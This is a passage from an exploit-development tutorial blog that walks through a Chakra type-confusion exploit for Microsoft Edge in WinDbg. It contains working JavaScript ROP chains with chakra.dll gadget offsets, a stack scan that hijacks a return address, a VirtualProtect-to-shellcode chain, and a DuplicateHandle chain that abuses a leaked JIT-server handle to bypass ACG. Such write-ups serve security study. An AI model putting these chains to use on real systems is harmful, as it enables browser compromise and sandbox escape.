    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x272beb, chakraHigh);         // 0x180272beb: jmp rax (Call KERNELBASE!VirtualProtect)
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x118b9, chakraHigh);          // 0x1800118b9: add rsp, 0x18 ; ret
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x4c1b65, chakraHigh);         // 0x1804c1b65: pop rdi ; ret
    inc();

    // Store the current offset within the .data section into a var
    ropoffsetTwo = countMe;

    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x00000000);                // Will be updated with the VirtualAllocEx allocation (our shellcode)
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x1ef039, chakraHigh);         // 0x1801ef039: push rdi ; ret (Return into our shellcode)
    inc();

    // We can reliably traverse the stack 0x6000 bytes
    // Scan the stack for the return address below
    /*
    0:020> u chakra+0xd4a73
    chakra!Js::JavascriptFunction::CallFunction<1>+0x83:
    00007fff`3a454a73 488b5c2478      mov     rbx,qword ptr [rsp+78h]
    00007fff`3a454a78 4883c440        add     rsp,40h
    00007fff`3a454a7c 5f              pop     rdi
    00007fff`3a454a7d 5e              pop     rsi
    00007fff`3a454a7e 5d              pop     rbp
    00007fff`3a454a7f c3              ret
    */

    // Creating an array to store the return address because read64() returns an array of 2 32-bit values
    var returnAddress = new Uint32Array(0x4);
    returnAddress[0] = chakraLo + 0xd4a73;
    returnAddress[1] = chakraHigh;

	// Counter variable
	let counter = 0x6000;

	// Loop
	while (counter != 0)
	{
	    // Store the contents of the stack
	    tempContents = read64(stackleakPointer[0]+counter, stackleakPointer[1]);

	    // Did we find our target return address?
        if ((tempContents[0] == returnAddress[0]) && (tempContents[1] == returnAddress[1]))
        {
			document.write("[+] Found our return address on the stack!");
            document.write("<br>");
            document.write("[+] Target stack address: 0x" + hex(stackleakPointer[1]) + hex(stackleakPointer[0]+counter));
            document.write("<br>");

            // Break the loop
            break;

        }
        else
        {
        	// Decrement the counter
	    	// This is because the leaked stack address is near the stack base so we need to traverse backwards towards the stack limit
	    	counter -= 0x8;
        }
	}

	// alert() for debugging
	alert("DEBUG");

	// Corrupt the return address to control RIP with 0x4141414141414141
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);
}
</script>
```

Before I explain the reasoning behind the ROP chain, let me say just two things:
1. Notice that we incremented `countMe` by `0x50` bytes after we wrote our shellcode. This is to ensure that our ROP chain and shellcode don't collide and we have a noticeable gap between them, so we can differentiate where the shellcode stops and the ROP chain begins
2. You can generate ROP gadgets for `chakra.dll` with the `rp++` utility leveraged in the first blog post. Here is the command: `rp-win-x64.exe -f C:\Windows\system32\chakra.dll -r 5 > C:\PATH\WHERE\YOU\WANT\TO\STORE\ROP\GADGETS\FILENAME.txt`. Again, this is outlined in [part two](https://connormcgarr.github.io/type-confusion-part-2/). From here you now will have a list of ROP gadgets from `chakra.dll`.

Now, let's explain this ROP chain.

This ROP chain will _not_ be executed anytime soon, nor will it be executed within the content process (where the exploit is being detonated). Instead, this ROP chain _and_ our shellcode will be injected into the JIT process (where ACG is disabled). From there we will hijack execution of the JIT process and force it to execute our ROP chain. The ROP chain (when executed) will:

1. Setup a call to `VirtualProtect` and mark our shellcode allocation as RWX
2. Jump to our shellcode and execute it

Again, this is all done within the JIT process. Another remark on the ROP chain - we can notice a few interesting things, such as the `lpAddress` parameter. According to the [documentation](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect) of `VirtualProtect` this parameter:

> The address of the starting page of the region of pages whose access protection attributes are to be changed.

So, based on our exploitation plan, we know that this `lpAddress` parameter will be the address of our shellcode allocation, once it is injected into the JIT process. However, the dilemma is the fact that at this point in the exploit we have not injected _any_ shellcode into the JIT process (at the time of our ROP chain and shellcode being stored in the content process). Therefore there is no way to fill this parameter with a correct value at the current moment, as we have yet to call `VirtualAllocEx` to actually inject the shellcode into the JIT process. Because of this, we setup our ROP chain as follows:

```javascript
(...)truncated(...)

write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x46377, chakraHigh);          // 0x180046377: pop rcx ; ret
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x00000000);                // LPVOID lpAddress (Eventually will be updated to the address we want to mark as RWX, our shellcode)
inc();
```

According to the `__fastcall` calling convention, the `lpAddress` parameter needs to be stored in the RCX register. However, we can see our ROP chain, as it currently stands, will only `pop` the value of `0` into RCX. We know, however, that we need the address of our shellcode to be placed here. Let me explain how we will reconcile this (we will step through all of this code when the time comes, but for now I just want to make this clear to the reader as to why our final ROP chain is only _partially_ completed at the current moment).

1. We will use `VirtualAllocEx` and `WriteProcessMemory` to allocate and write our shellcode into the JIT process with our first few ROP chains of our exploit.
2. `VirtualAllocEx` will return the address of our shellcode within the JIT process
3. When `VirtualAllocEx` returns the address of the remote allocation within the JIT process, we will use a call to `WriteProcessMemory` to write the _actual_ address of our shellcode in the JIT process (which we now have because we injected it with `VirtualAllocEx`) into our final ROP chain (which currently is using a "blank placeholder" for `lpAddress`).

Lastly, we know that our final ROP chain (the one we are storing and updating with the aforesaid steps) not only marks our shellcode as RWX, but it is also responsible for returning into our shellcode. This can be seen in the below snippet of the `VirtualProtect` ROP chain.

```javascript
(...)truncated(...)

write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x4c1b65, chakraHigh);         // 0x1804c1b65: pop rdi ; ret
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x00000000);                // Will be updated with the VirtualAllocEx allocation (our shellcode)
inc();
write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x1ef039, chakraHigh);         // 0x1801ef039: push rdi ; ret (Return into our shellcode)
```

Again, we are currently using a blank "parameter placeholder" in this case, as our `VirtualProtect` ROP chain doesn't know where our shellcode was injected into the JIT process (as it hasn't happened at this point in the exploitation process). We will be updating this eventually. For now, let me summarize briefly what we are doing:

1. Storing shellcode + `VirtualProtect` ROP chain with the `.data` section of `chakra.dll` (in the JIT process)
2. These items will eventually be injected into the JIT process (where ACG is disabled).
3. We will hijack control-flow execution in the JIT process to force it to execute our ROP chain. Our ROP chain will mark our shellcode as RWX and jump to it
4. Lastly, our ROP chain is missing some information, as the shellcode hasn't been injected. This information will be reconciled with our "long" ROP chains that we are about to embark on in the next few sections of this blog post. So, for now, the "final" `VirtualProtect` ROP chain has some missing information, which we will reconcile on the fly.

Lastly, before moving on, let's see how our shellcode and ROP chain look like after we execute our exploit (as it currently is).

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion69.png" alt="">

After executing the script, we can then (before we close the dialogue) attach WinDbg to the content process and examine `chakra_base + 0x74b000` to see if everything was written properly.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion70.png" alt="">

As we can see, we have successfully stored our shellcode and ROP chain (which will be executed in the future).

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion71.png" alt="">

Let's now start working on our exploit in order to achieve execution of our final ROP chain and shellcode.

`DuplicateHandle` ROP Chain
---
Before we begin, each ROP gadget I write has an associated comment. My blog will sometimes cut these off when I paste a code snippet, and you might be required to slide the bar under the code snippet to the right to see comments.

We have, as we have seen, already prepared what we are eventually going to execute within the JIT process. However, we still have to figure out _how_ we are going to inject these into the JIT process, and begin code execution. This journey to this goal begins with our overwritten return address, causing control-flow hijacking, to start our ROP chain (just like in part two of this blog series). However, instead of directly executing a ROP chain to call `WinExec`, we will be chaining together _multiple_ ROP chains in order to achieve this goal. Everything that happens in our exploit now happens in the content process (for the foreseeable future).

A caveat before we begin. Everything, from here on out, will begin at these lines of our exploit:

```javascript
// alert() for debugging
alert("DEBUG");

// Corrupt the return address to control RIP with 0x4141414141414141
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);
```

We will start writing our ROP chain where the `Corrupt the return address to control RIP with 0x4141414141414141` comment is (just like in part two). Additionally, we are going to truncate (from here on out, until our final code) everything that comes _before_ our `alert()` call. This is to save space in this blog post. This is synonymous from what we did in part two. So again, _nothing_ that comes before the `alert()` statement will be changed. Let's begin now.

As previously mentioned, it is possible to obtain a `PROCESS_ALL_ACCESS` handle to the JIT server by abusing the `PROCESS_DUP_HANDLE` handle stored in `s_jitManager`. Using our stack control, we know the next goal is to instrument a ROP chain. Although we will be leveraging multiple _chained_ ROP chains, our process begins with a call to `DuplicateHandle` -  in order to retrieve a privileged handle to the JIT server. This will allow us to compromise the JIT server, where ACG is disabled. This call to `DuplicateHandle` will be as follows:

```c
DuplicateHandle(
	jitHandle,		// Leaked from s_jitManager+0x8 with PROCESS_DUP_HANDLE permissions
	GetCurrentProcess(),	// Pseudo handle to the current process
	GetCurrentProcess(),	// Pseudo handle to the current process
	&fulljitHandle,		// Variable we supply that will receive the PROCESS_ALL_ACCESS handle to the JIT server
	0,			// NULL since we will set dwOptions to DUPLICATE_SAME_ACCESS
	0,			// FALSE (new handle isn't inherited)
	DUPLICATE_SAME_ACCESS	// Duplicate handle has same access as source handle (source handle is an all access handle, e.g. a pseudo handle), meaning the duplicated handle will be PROCESS_ALL_ACCESS
);
```

With this in mind, here is how the function call will be setup via ROP:

```javascript
// alert() for debugging
alert("DEBUG");

// Store the value of the handle to the JIT server by way of chakra!ScriptEngine::SetJITConnectionInfo (chakra!JITManager+s_jitManager+0x8)
jitHandle = read64(chakraLo+0x74d838, chakraHigh);

// Helper function to be called after each stack write to increment offset to be written to
function next()
{
    counter+=0x8;
}

// Begin ROP chain
// Since __fastcall requires parameters 5 and so on to be at RSP+0x20, we actually have to put them at RSP+0x28
// This is because we don't push a return address on the stack, as we don't "call" our APIs, we jump into them
// Because of this we have to compensate by starting them at RSP+0x28 since we can't count on a return address to push them there for us

// DuplicateHandle() ROP chain
// Stage 1 -> Abuse PROCESS_DUP_HANDLE handle to JIT server by performing DuplicateHandle() to get a handle to the JIT server with full permissions
// ACG is disabled in the JIT process
// https://bugs.chromium.org/p/project-zero/issues/detail?id=1299

// Writing our ROP chain to the stack, stack+0x8, stack+0x10, etc. after return address overwrite to hijack control-flow transfer

// HANDLE hSourceProcessHandle (RCX) _should_ come first. However, we are configuring this parameter towards the end, as we need RCX for the lpTargetHandle parameter

// HANDLE hSourceHandle (RDX)
// (HANDLE)-1 value of current process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Pseudo-handle to current process
next();

// HANDLE hTargetProcessHandle (R8)
// (HANDLE)-1 value of current process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();

// LPHANDLE lpTargetHandle (R9)
// This needs to be a writable address where the full JIT handle will be stored
// Using .data section of chakra.dll in a part where there is no data
/*
0:053> dqs chakra+0x72E000+0x20010
00007ffc`052ae010  00000000`00000000
00007ffc`052ae018  00000000`00000000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72e128, chakraHigh);      // .data pointer from chakra.dll with a non-zero value to bypass cmp r8d, [rax] future gadget
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server;
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hSourceProcessHandle (RCX)
// Handle to the JIT process from the content process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], jitHandle[0], jitHandle[1]);         // PROCESS_DUP_HANDLE HANDLE to JIT server
next();

// Call KERNELBASE!DuplicateHandle
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], duplicateHandle[0], duplicateHandle[1]); // KERNELBASE!DuplicateHandle (Recall this was our original leaked pointer var for kernelbase.dll)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!DuplicateHandle)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!DuplicateHandle - 0x180243949: add rsp, 0x38 ; ret
next(); 
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // DWORD dwDesiredAccess (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // BOOL bInheritHandle (RSP+0x30)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000002, 0x00000000);             // DWORD dwOptions (RSP+0x38)
next();
```

Before stepping through our ROP chain, notice the first thing we do is read the JIT server handle:

```javascript
// alert() for debugging
alert("DEBUG");

// Store the value of the handle to the JIT server by way of chakra!ScriptEngine::SetJITConnectionInfo (chakra!JITManager+s_jitManager+0x8)
jitHandle = read64(chakraLo+0x74d838, chakraHigh);
```

After reading in and storing this value, we can begin our ROP chain. Let's now step through the chain together in WinDbg. As we can see from our `DuplicateHandle` ROP chain, we are overwriting RIP (which we previously did with `0x4141414141414141` in our control-flow hijack proof-of-concept via return address overwrite) with a ROP gadget of `pop rdx ; ret`, which is located at `chakra_base + 0x1d2c9`. Let's set a breakpoint here, and detonate our exploit. Again, as a point of contention - the `__fastcall` calling convention is in play - meaning arguments go in RCX, RDX, R8, R9, RSP + `0x20`, etc.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion72.png" alt="">

After hitting the breakpoint, we can inspect RSP to confirm our ROP chain has been written to the stack.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion73.png" alt="">

Our first gadget, as we know, is a `pop rdx ; ret` gadget. After execution of this gadget, we have stored a pseudo-handle with `PROCESS_ALL_ACCESS` into RDX. 

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion74.png" alt="">

This brings our function call to `DuplicateHandle` to the following state:

```c
DuplicateHandle(
	-
	GetCurrentProcess(),	// Pseudo handle to the current process
	-
	-
	-
	-
	-
);
```

Our next gadget is `mov r8, rdx ; add rsp, 0x48 ; ret`. This will copy the pseudo-handle currently in RDX into R8 also.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion75.png" alt="">

We should also note that this ROP gadget increments the stack by `0x48` bytes. This is why in the ROP sequence we have `0x4141414141414141` padding "opcodes". This padding is here to ensure that when the `ret` happens in our ROP gadget, execution returns to the next ROP gadget we want to execute, and not `0x48` bytes down the stack to a location we don't intend execution to go to:

```javascript
// HANDLE hTargetProcessHandle (R8)
// (HANDLE)-1 value of current process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
```

This brings our `DuplicateHandle` call to the following state:

```c
DuplicateHandle(
	-
	GetCurrentProcess(),	// Pseudo handle to the current process
	GetCurrentProcess(),	// Pseudo handle to the current process
	-
	-
	-
	-
);
```

The next ROP gadget sequence contains an interesting item. The next item on our agenda will be to provide `DuplicateHandle` with an "output buffer" to write the new duplicated-handle (when the call to `DuplicateHandle` occurs). We achieve this by providing a memory address, which is writable, in R9. The address we will use is an empty address within the `.data` section of `chakra.dll`. We achieve this with the following ROP gadget:

```
mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
```

As we can see, we load the address we want to place in R9 within RCX. The `mov r9, rcx` instruction will load our intended "output buffer" within R9, setting up our call to `DuplicateHandle` properly. However, there are some residual instructions we need to deal with - most notably the `cmp r8d, [rax]` instruction. As we can see, this instruction will dereference RAX (e.g. extract the contents that the value in RAX points to) and compare it to `r8d`. We don't necessarily care about the `cmp` instruction so much as we do about the fact that RAX is dereferenced. This means in order for this ROP gadget to work properly, we need to load a _valid_ pointer in RAX. In this exploit, we just choose a random address within the `chakra.dll` address space. Do not over think as to "why did Connor choose this specific address". This could literally be _any_ address!

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion76.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion77.png" alt="">

As we can see, RAX now has a valid pointer in it. Moving our, our next ROP gadget is a `pop rcx ; ret` gadget. As previously mentioned, we load the _actual_ value we want to pass into `DuplicateHandle` via the R9 register into RCX. A future ROP gadget will copy RCX into the R9 register. 

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion78.png" alt="">

Our `.data` address of `chakra.dll` is loaded into RCX. This memory address is where our `PROCESS_ALL_ACCESS` handle to the JIT server will be located after our call to `DuplicateHandle`.

Now that we have prepared RAX with a valid pointer and prepared RCX with the address we want `DuplicateHandle` to write our `PROCESS_ALL_ACCESS` handle to, we hit the `mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret` ROP gadget.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion79.png" alt="">

We have successfully copied our output "buffer", which will hold our full-permissions handle to the JIT server after the `DuplicateHandle` call into R9. Next up, we can see the `cmp r8d, dword ptr [rax]` instruction. WinDbg now shows that the dereferenced contents of RAX contains _some_ valid contents - meaning RAX was successfully prepared with a pointer to "bypass" this `cmp` check. Essentially, we ensure we don't incur an access violation as a result of an invalid address being dereferenced by RAX.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion80.png" alt="">

The next item on the agenda is the `je` instruction - which essentially performs the jump to the specified address above (`chakra!Js::InternalStringComparer::Equals+0x28`) if the result of subtracting EAX, a 32-bit register (referenced via `dword ptr [rax]`, meaning essentially EAX) from R8D (a 32-bit register) is 0. As we know, we already prepared R8 with a value of `0xffffffffffffffff` - meaning the jump won't take place, as `0xffffffffffffffff` - `0x7fff3d82e010` does _not_ equal zero. After this, an `add rsp, 0x28` instruction occurs - and, as we saw in our ROP gadget snippet at the beginning of this section of the blog, we pad the stack with `0x28` bytes to ensure execution returns into the next ROP gadget, and not into something we don't intend it to (e.g. `0x28` bytes "down" the stack without any padding).

Our call to `DuplicateHandle` is now at the following state:

```c
DuplicateHandle(
	-
	GetCurrentProcess(),	// Pseudo handle to the current process
	GetCurrentProcess(),	// Pseudo handle to the current process
	&fulljitHandle,		// Variable we supply that will receive the PROCESS_ALL_ACCESS handle to the JIT server
	-
	-
	-
);
```

Since RDX, R8, and R9 are taken care of - we can finally fill in RCX with the handle to the JIT server that is currently within the `s_jitManager`. This is an "easy" ROP sequence - as the handle is stored in a global variable `s_jitManager + 0x8` and we can just place it on the stack and pop it into RCX with a `pop rcx ; ret` gadget. We have already used our arbitrary read to leak the raw handle value (in this case it is `0xa64`, but is subject to change on a per-process basis).

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion81.png" alt="">

You may notice above the value of the stack changed. This is simply because I restarted Edge, and as we know - the stack changes on a per-process basis. This is not a big deal at all - I just wanted to make note to the reader.

After the `pop rcx` instruction - the `PROCESS_DUP_HANDLE` handle to the JIT server is stored in RCX.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion82.png" alt="">

Our call to `DuplicateHandle` is now at the following state:

```c
DuplicateHandle(
	jitHandle,		// Leaked from s_jitManager+0x8 with PROCESS_DUP_HANDLE permissions
	GetCurrentProcess(),	// Pseudo handle to the current process
	GetCurrentProcess(),	// Pseudo handle to the current process
	&fulljitHandle,		// Variable we supply that will receive the PROCESS_ALL_ACCESS handle to the JIT server
	-
	-
	-
);
```

Per the `__fastcall` calling convention, every argument after the first four are placed onto the stack. Because we have an arbitrary write primitive, we can just directly write our next 3 arguments for `DuplicateHandle` to the stack - we don't need any ROP gadgets to `pop` any further arguments. With this being said, we will go ahead and continue to use our ROP chain to actually place `DuplicateHandle` into the RAX register. We then will perform a `jmp rax` instruction to kick our function call off. So, for now, let's focus on getting the address of `kernelbase!DuplicateHandle` into RAX. This begins with a `pop rax` instruction. As we can see below, RAX, after the `pop rax`, contains `kernelbase!DuplicateHandle`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion83.png" alt="">

After RAX is filled with `kernelbase!DuplicateHandle`, the `jmp rax` instruction is queued for execution.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion84.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion85.png" alt="">

Let's quickly recall our ROP chain snippet.

```javascript
// Call KERNELBASE!DuplicateHandle
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], duplicateHandle[0], duplicateHandle[1]); // KERNELBASE!DuplicateHandle (Recall this was our original leaked pointer var for kernelbase.dll)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!DuplicateHandle)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!DuplicateHandle - 0x180243949: add rsp, 0x38 ; ret
next(); 
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // DWORD dwDesiredAccess (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // BOOL bInheritHandle (RSP+0x30)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000002, 0x00000000);             // DWORD dwOptions (RSP+0x38)
next();
```

Let's break down what we are seeing above:

1. RAX contains `kernelbase!DuplicateHandle`
2. `kernelbase!DuplicateHandle` is a function. When it is called legitimately, it ends in a `ret` instruction to return execution to where it was called (this is usually a return to the stack)
3. Our "return" address jumps over our "shadow space". Remember, `__fastcall` requires the 5th parameter, and subsequent parameters, begin at RSP + `0x20`, RSP + `0x28`, RSP + `0x38`, etc. The space between RSP and RSP + `0x20`, which is unused, is referred to as "shadow space"
4. Our final three parameters are written _directly_ to the stack

Step one is very self explanatory. Let's explain steps two through four quickly. When `DuplicateHandle` is called legitimately, execution can be seen below.

Prior to the call:
<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion86.png" alt="">

After the call:
<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion87.png" alt="">

Notice what our `call` instruction does under the hood. `call` pushes the return address on the stack for `DuplicateHandle`. When this `push` occurs, it also changes the state of the stack so that every item is pushed down `0x8` bytes. Essentially, when `call` happens RSP becomes RSP + `0x8`, and so forth. This is very important to us.

Recall that we do not actually `call` `DuplicateHandle`. Instead, we perform a `jmp` to it. Since we are using `jmp`, this doesn't push a return address onto the stack for execution to return to. Because of this, we supply our _own_ return address located at `RSP` when the `jmp` occurs - this "mimics" what `call` does. Additionally, this also means we have to push our last three parameters `0x8` bytes down the stack. Again, `call` would normally do this for us - but since `call` isn't used here, we have to manually add our return address an manually increment the stack by `0x8`. This is because although `__fastcall` requires 5th and subsequent parameters to start at RSP + `0x20`, internally the calling convention knows when the `call` is performed, the parameters will actually be shifted by `0x8` bytes due to the pushed `ret` address on the stack. So tl;dr - although `__fastcall` says we put parameters at RSP + `0x20`, we actually need to start them at RSP + `0x28`.

The above will be true for all subsequent ROP chains.

So, after we get `DuplicateHandle` into RAX we then can directly write our final three arguments directly to the stack leveraging our arbitrary write primitive.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion88.png" alt="">

Our call to `DuplicateHandle` is in its final state:

```c
DuplicateHandle(
	jitHandle,		// Leaked from s_jitManager+0x8 with PROCESS_DUP_HANDLE permissions
	GetCurrentProcess(),	// Pseudo handle to the current process
	GetCurrentProcess(),	// Pseudo handle to the current process
	&fulljitHandle,		// Variable we supply that will receive the PROCESS_ALL_ACCESS handle to the JIT server
	0,			// NULL since we will set dwOptions to DUPLICATE_SAME_ACCESS
	0,			// FALSE (new handle isn't inherited)
	DUPLICATE_SAME_ACCESS	// Duplicate handle has same access as source handle (source handle is an all access handle, e.g. a pseudo handle), meaning the duplicated handle will be PROCESS_ALL_ACCESS
);
```

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion89.png" alt="">

From here, we should be able to step into the function call to `DuplicateHandle`, execute it.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion90.png" alt="">

We can use `pt` to tell WinDbg to execute `DuplicateHandle` and pause when we hit the `ret` to exit the function

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion91.png" alt="">

At this point, our call should have been successful! As we see above, a value was placed in our "output buffer" to receive the duplicated handle. This value is `0x0000000000000ae8`. If we run Process Hacker as an administrator, we can confirm that this is a handle to the JIT server with `PROCESS_ALL_ACCESS`!

